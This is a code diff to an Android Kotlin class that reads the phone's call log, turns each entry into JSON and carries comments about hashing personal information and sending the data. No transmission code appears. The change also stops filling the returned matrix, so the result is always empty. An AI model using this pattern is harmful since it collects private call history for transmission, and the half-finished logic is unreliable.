@@ -9,6 +9,7 @@ import android.database.Cursor
 import android.provider.CallLog.Calls.*
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
+import com.google.gson.Gson
 
 class PhoneInfo {
 
@@ -26,7 +27,6 @@ class PhoneInfo {
                 null,
                 null
             )
-
             cursorToMatrix(cursor, userName)
         }
     }
@@ -42,15 +42,12 @@ class PhoneInfo {
                     it.getStringFromColumn(DATE),
                     it.getStringFromColumn(DURATION)
                 )
-
-                matrix.add(list.toList())
+                val json = Gson().toJson(list)
                 //hash personal info
-                //get json
                 //send json
 
             }
         }
-
         return matrix
     }
 
